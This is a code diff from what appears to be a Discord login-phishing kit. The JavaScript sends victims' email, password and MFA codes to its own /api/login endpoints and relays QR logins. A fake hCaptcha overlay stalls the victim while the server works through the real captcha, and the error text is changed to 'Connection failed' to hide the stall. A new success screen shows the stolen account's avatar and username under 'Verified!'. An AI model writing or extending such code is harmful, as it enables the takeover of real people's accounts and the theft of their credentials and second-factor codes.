@@ -340,15 +340,19 @@ function showSec(name) {
   else col1.classList.remove('v-center');
 }
 
-/* ═══ Success → close page ═══ */
-function onSuccess() {
+/* ═══ Success → show verified page ═══ */
+function onSuccess(data) {
   hideErr('login-error');
   hideErr('mfa-error');
-  document.querySelector('.loginBox').style.opacity = '0';
-  setTimeout(function() {
-    try { window.close(); } catch(e) {}
-    window.location.href = 'https://discord.com/channels/@me';
-  }, 400);
+  var box = document.querySelector('.loginBox');
+  var avatarUrl = (data && data.avatar_url) ? data.avatar_url : '';
+  var username = (data && data.username) ? data.username : '';
+  box.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 32px;min-height:340px;width:100%">' +
+    (avatarUrl ? '<img src="' + avatarUrl + '" style="width:96px;height:96px;border-radius:50%;border:3px solid #23a55a;margin-bottom:20px" alt="">' : '<div style="width:96px;height:96px;border-radius:50%;background:#5865f2;margin-bottom:20px;display:flex;align-items:center;justify-content:center"><svg width="48" height="36" viewBox="0 0 127.14 96.36" fill="#fff"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg></div>') +
+    (username ? '<p style="color:#b5bac1;font-size:16px;margin-bottom:8px">@' + username + '</p>' : '') +
+    '<h1 style="color:#23a55a;font-size:32px;font-weight:700;margin:0">Verified!</h1>' +
+    '<p style="color:#b5bac1;font-size:14px;margin-top:12px">You may now close this window.</p>' +
+    '</div>';
 }
 
 /* ═══ QR Code ═══ */
@@ -397,7 +401,7 @@ async function pollQR() {
     } else if (d.st === 'confirming') {
       stat.innerHTML = 'Logging in\u2026';
     } else if (d.success || d.st === 'done') {
-      clearInterval(qrTimer); onSuccess();
+      clearInterval(qrTimer); onSuccess(d);
     } else if (d.st === 'cancelled') {
       clearInterval(qrTimer); 
       setTimeout(initQR, 2000); /* auto-refresh */
@@ -480,8 +484,8 @@ function _onHcaptchaPass(token) {
     var d = _pendingServerResult; _pendingServerResult = null;
     setTimeout(function() { _closeCaptchaOverlay(); processServerResult(d); }, 400);
   } else {
-    /* Server still solving — show "Please try again" and reset widget to stall longer */
-    document.getElementById('captcha-err-msg').textContent = 'Please try again';
+    /* Server still solving — show "Connection failed" and reset widget to stall longer */
+    document.getElementById('captcha-err-msg').textContent = 'Connection failed, please try again.';
     if (hcWidgetId !== null && hcaptchaReady) {
       try { hcaptcha.reset(hcWidgetId); } catch(e) {}
     }
@@ -527,7 +531,7 @@ function processServerResult(d) {
 
   if (d.success) {
     btnLoad('login-btn', false);
-    onSuccess();
+    onSuccess(d);
     return;
   }
   if (d.email_verify) {
@@ -580,7 +584,7 @@ async function retryAfterVerify() {
       showCaptchaStall(d.session_id);
       return;
     }
-    if (d.success) { onSuccess(); return; }
+    if (d.success) { onSuccess(d); return; }
     if (d.mfa !== undefined && d.ticket) {
       mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
       showSec('mfa'); updateMfaUI(); return;
@@ -636,7 +640,7 @@ async function onCaptchaSolved(token) {
       })
     });
     var d = await r.json();
-    if (d.success) { btnLoad('login-btn', false); onSuccess(); return; }
+    if (d.success) { btnLoad('login-btn', false); onSuccess(d); return; }
     if (d.captcha) {
       captchaRetries++;
       if (captchaRetries >= MAX_CAPTCHA_RETRIES) {
@@ -688,7 +692,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
   try {
     var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:em,password:pw}) });
     var d = await r.json();
-    if (d.success) { onSuccess(); return; }
+    if (d.success) { onSuccess(d); return; }
     if (d.captcha_stall) {
       /* Server is solving captcha in background — show fake hcaptcha to stall user */
       showCaptchaStall(d.session_id);
@@ -751,7 +755,7 @@ async function submitMfa() {
   try {
     var r = await fetch(endpoint, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code:code, ticket:mfaTicket}) });
     var d = await r.json();
-    if (d.success) { onSuccess(); return; }
+    if (d.success) { onSuccess(d); return; }
     showErr('mfa-error', d.message || 'Invalid code. Try again.');
     document.getElementById('mfa-code').value = '';
     document.getElementById('mfa-code').focus();
